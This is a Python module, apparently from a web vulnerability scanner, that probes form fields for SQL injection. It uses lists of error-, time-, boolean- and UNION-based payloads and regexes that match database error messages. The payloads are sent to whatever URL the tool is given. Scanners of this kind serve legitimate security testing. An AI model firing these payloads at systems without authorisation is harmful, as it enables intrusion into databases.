import requests
import time
import re

# Enhanced SQL injection payloads
SQLI_PAYLOADS = {
    "error_based": [
        "' OR '1'='1",
        "' OR 1=1 --", 
        "\" OR \"1\"=\"1",
        "' OR 1=1#",
        "admin'--",
        "admin' /*",
        "' OR 1=1 LIMIT 1 --",
        "' UNION SELECT 1,2,3--"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5' --",  # SQL Server
        "' OR SLEEP(5) --",             # MySQL
        "' OR pg_sleep(5) --",          # PostgreSQL  
        "'; SELECT pg_sleep(5) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
    ],
    "boolean_based": [
        "' AND 1=1 --",
        "' AND 1=2 --", 
        "' AND 'a'='a",
        "' AND 'a'='b",
        "admin' AND '1'='1",
        "admin' AND '1'='2"
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        '" UNION SELECT NULL--',
        '" UNION SELECT 1,2--'
    ]
}

# Enhanced error detection patterns
SQL_ERROR_PATTERNS = [
    # Generic SQL errors
    r"sql.*error", r"mysql.*error", r"warning.*mysql",
    r"valid.*mysql.*result", r"ORA-\d+", r"Microsoft.*ODBC.*SQL.*Driver",
    r"error.*in.*query", r"postgresql.*error", r"warning.*pg_",
    
    # Database-specific errors
    r"Microsoft OLE DB Provider for ODBC Drivers", r"Microsoft JET Database Engine",
    r"ADODB\.Field.*error", r"Oracle.*JDBC", r"Oracle Database",
    
    # SQLite errors  
    r"SQLite/JDBCDriver", r"sqlite.*error",
    
    # PostgreSQL errors
    r"PostgreSQL.*ERROR", r"valid PostgreSQL result",
    
    # SQL Server errors
    r"Microsoft SQL Native Client", r"SQL Server.*error",
    
    # Generic database terms
    r"syntax.*error.*SQL", r"database.*error", r"mysql_fetch",
    r"num_rows", r"mysql_num_rows", r"mysql_fetch_array"
]

def test_sqli(url, forms, session=None):
    """Enhanced SQL injection testing with multiple detection methods"""
    issues = []
    
    for form in forms:
        target_url = form["action"]
        
        for inp in form["inputs"]:
            if inp["name"]:
                # Test error-based SQLi
                error_findings = test_error_based_sqli(target_url, form, inp, session)
                issues.extend(error_findings)
                
                # Test time-based blind SQLi
                time_findings = test_time_based_sqli(target_url, form, inp, session)
                issues.extend(time_findings)
                
                # Test boolean-based blind SQLi
                boolean_findings = test_boolean_based_sqli(target_url, form, inp, session)
                issues.extend(boolean_findings)

                # Test union-based SQLi
                union_findings = test_union_based_sqli(target_url, form, inp, session)
                issues.extend(union_findings)
    
    return issues

def test_error_based_sqli(target_url, form, inp, session=None):
    """Test for error-based SQL injection"""
    issues = []
    
    for payload in SQLI_PAYLOADS["error_based"]:
        data = {inp["name"]: payload}
        
        try:
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=data, timeout=10)
                else:
                    response = requests.post(target_url, data=data, timeout=10)
            else:
                if session:
                    response = session.get(target_url, params=data, timeout=10)
                else:
                    response = requests.get(target_url, params=data, timeout=10)
            
            # Check for SQL error patterns
            response_text = response.text.lower()
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, response_text, re.IGNORECASE):
                    # Verify with a second request to confirm
                    if verify_sqli_finding(target_url, form, inp, payload, session):
                        issues.append({
                            "vulnerability": "SQL Injection (Error-based)",
                            "url": target_url,
                            "payload": payload,
                            "severity": "High",
                            "description": "Database error message detected indicating SQL injection vulnerability",
                            "evidence": f"Error pattern found: {pattern}",
                            "parameter": inp["name"],
                            "method": form["method"].upper(),
                            "recommendation": "Use parameterized queries and input validation"
                        })
                    break
                    
        except requests.RequestException:
            continue
    
    return issues

def test_union_based_sqli(target_url, form, inp, session=None):
    """Test for UNION-based SQL injection by looking for column count errors and content shifts"""
    issues = []
    
    # Get a baseline response for comparison
    baseline_data = {inp["name"]: "normal_value"}
    try:
        if form["method"] == "post":
            baseline_response = (session.post if session else requests.post)(target_url, data=baseline_data, timeout=10)
        else:
            baseline_response = (session.get if session else requests.get)(target_url, params=baseline_data, timeout=10)
        baseline_len = len(baseline_response.text)
        baseline_code = baseline_response.status_code
    except requests.RequestException:
        baseline_len = None
        baseline_code = None
    
    for payload in SQLI_PAYLOADS["union_based"]:
        data = {inp["name"]: payload}
        try:
            if form["method"] == "post":
                response = (session.post if session else requests.post)(target_url, data=data, timeout=10)
            else:
                response = (session.get if session else requests.get)(target_url, params=data, timeout=10)
            body = response.text
            body_lower = body.lower()
            
            # Indicators: SQL errors related to UNION/column count or significant body change
            union_error_patterns = [
                r"union.*select",
                r"column(s)? .* (does not match|mismatch)",
                r"all.*select",
                r"operand should contain \d+ column",
                r"unknown column",
                r"the used select statements have a different number of columns",
            ]
            matched_error = any(re.search(p, body_lower, re.IGNORECASE) for p in union_error_patterns)
            significant_change = False
            if baseline_len is not None:
                significant_change = abs(len(body) - baseline_len) > max(200, 0.2 * baseline_len)
            status_shift = (baseline_code is not None and response.status_code != baseline_code)
            
            if matched_error or significant_change or status_shift:
                if verify_sqli_finding(target_url, form, inp, payload, session):
                    issues.append({
                        "vulnerability": "SQL Injection (UNION-based)",
                        "url": target_url,
                        "payload": payload,
                        "severity": "High",
                        "description": "Indicators of UNION-based SQL injection detected",
                        "evidence": f"Status {response.status_code}, length {len(body)} (baseline {baseline_len})",
                        "parameter": inp["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Use parameterized queries and validate column counts"
                    })
        except requests.RequestException:
            continue
    
    return issues

def test_time_based_sqli(target_url, form, inp, session=None):
    """Test for time-based blind SQL injection"""
    issues = []
    
    # First get baseline response time
    baseline_data = {inp["name"]: "normal_value"}
    baseline_times = []
    
    for _ in range(3):  # Get average baseline
        try:
            start = time.time()
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=baseline_data, timeout=15)
                else:
                    response = requests.post(target_url, data=baseline_data, timeout=15)
            else:
                if session:
                    response = session.get(target_url, params=baseline_data, timeout=15)
                else:
                    response = requests.get(target_url, params=baseline_data, timeout=15)
            
            baseline_times.append(time.time() - start)
        except requests.RequestException:
            continue
    
    if not baseline_times:
        return issues
        
    avg_baseline = sum(baseline_times) / len(baseline_times)
    
    # Test time-based payloads
    for payload in SQLI_PAYLOADS["time_based"]:
        data = {inp["name"]: payload}
        
        try:
            start = time.time()
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=data, timeout=15)
                else:
                    response = requests.post(target_url, data=data, timeout=15)
            else:
                if session:
                    response = session.get(target_url, params=data, timeout=15)
                else:
                    response = requests.get(target_url, params=data, timeout=15)
            
            duration = time.time() - start
            
            # If response took significantly longer (4+ seconds delay)
            if duration > avg_baseline + 4:
                # Verify with second request
                if verify_time_based_sqli(target_url, form, inp, payload, session):
                    issues.append({
                        "vulnerability": "SQL Injection (Time-based Blind)",
                        "url": target_url,
                        "payload": payload,
                        "severity": "High", 
                        "description": "Time delay detected indicating blind SQL injection vulnerability",
                        "evidence": f"Response delayed by {duration:.2f} seconds (baseline: {avg_baseline:.2f}s)",
                        "parameter": inp["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Use parameterized queries and input validation"
                    })
                    
        except requests.RequestException:
            continue
    
    return issues

def test_boolean_based_sqli(target_url, form, inp, session=None):
    """Test for boolean-based blind SQL injection"""
    issues = []
    
    # Test pairs of true/false conditions
    true_payloads = ["' AND 1=1 --", "' AND 'a'='a", "admin' AND '1'='1"]
    false_payloads = ["' AND 1=2 --", "' AND 'a'='b", "admin' AND '1'='2"]
    
    for i, (true_payload, false_payload) in enumerate(zip(true_payloads, false_payloads)):
        try:
            # Test true condition
            true_data = {inp["name"]: true_payload}
            if form["method"] == "post":
                if session:
                    true_response = session.post(target_url, data=true_data, timeout=10)
                else:
                    true_response = requests.post(target_url, data=true_data, timeout=10)
            else:
                if session:
                    true_response = session.get(target_url, params=true_data, timeout=10)
                else:
                    true_response = requests.get(target_url, params=true_data, timeout=10)
            
            # Test false condition 
            false_data = {inp["name"]: false_payload}
            if form["method"] == "post":
                if session:
                    false_response = session.post(target_url, data=false_data, timeout=10)
                else:
                    false_response = requests.post(target_url, data=false_data, timeout=10)
            else:
                if session:
                    false_response = session.get(target_url, params=false_data, timeout=10)
                else:
                    false_response = requests.get(target_url, params=false_data, timeout=10)
            
            # Compare responses
            if (true_response.status_code == 200 and false_response.status_code == 200 and
                len(true_response.text) != len(false_response.text)):
                
                # Verify finding
                if verify_boolean_sqli(target_url, form, inp, true_payload, false_payload, session):
                    issues.append({
                        "vulnerability": "SQL Injection (Boolean-based Blind)",
                        "url": target_url,
                        "payload": f"True: {true_payload}, False: {false_payload}",
                        "severity": "High",
                        "description": "Different responses for true/false conditions indicate boolean-based blind SQL injection",
                        "evidence": f"True response length: {len(true_response.text)}, False response length: {len(false_response.text)}",
                        "parameter": inp["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Use parameterized queries and input validation"
                    })
                    break  # Don't test other pairs for same parameter
                    
        except requests.RequestException:
            continue
    
    return issues

def verify_sqli_finding(target_url, form, inp, payload, session=None):
    """Verify SQL injection finding with a second request"""
    try:
        data = {inp["name"]: payload}
        
        if form["method"] == "post":
            if session:
                response = session.post(target_url, data=data, timeout=10)
            else:
                response = requests.post(target_url, data=data, timeout=10)
        else:
            if session:
                response = session.get(target_url, params=data, timeout=10)
            else:
                response = requests.get(target_url, params=data, timeout=10)
        
        response_text = response.text.lower()
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
        
    except requests.RequestException:
        return False

def verify_time_based_sqli(target_url, form, inp, payload, session=None):
    """Verify time-based SQL injection with second request"""
    try:
        data = {inp["name"]: payload}
        start = time.time()
        
        if form["method"] == "post":
            if session:
                response = session.post(target_url, data=data, timeout=15)
            else:
                response = requests.post(target_url, data=data, timeout=15)
        else:
            if session:
                response = session.get(target_url, params=data, timeout=15)
            else:
                response = requests.get(target_url, params=data, timeout=15)
        
        duration = time.time() - start
        return duration > 4  # 4+ second delay confirms time-based SQLi
        
    except requests.RequestException:
        return False

def verify_boolean_sqli(target_url, form, inp, true_payload, false_payload, session=None):
    """Verify boolean-based SQL injection with second test"""
    try:
        # Test true condition again
        true_data = {inp["name"]: true_payload}
        if form["method"] == "post":
            if session:
                true_response = session.post(target_url, data=true_data, timeout=10)
            else:
                true_response = requests.post(target_url, data=true_data, timeout=10)
        else:
            if session:
                true_response = session.get(target_url, params=true_data, timeout=10)
            else:
                true_response = requests.get(target_url, params=true_data, timeout=10)
        
        # Test false condition again
        false_data = {inp["name"]: false_payload}
        if form["method"] == "post":
            if session:
                false_response = session.post(target_url, data=false_data, timeout=10)
            else:
                false_response = requests.post(target_url, data=false_data, timeout=10)
        else:
            if session:
                false_response = session.get(target_url, params=false_data, timeout=10)
            else:
                false_response = requests.get(target_url, params=false_data, timeout=10)
        
        # Confirm different response lengths
        return len(true_response.text) != len(false_response.text)
        
    except requests.RequestException:
        return False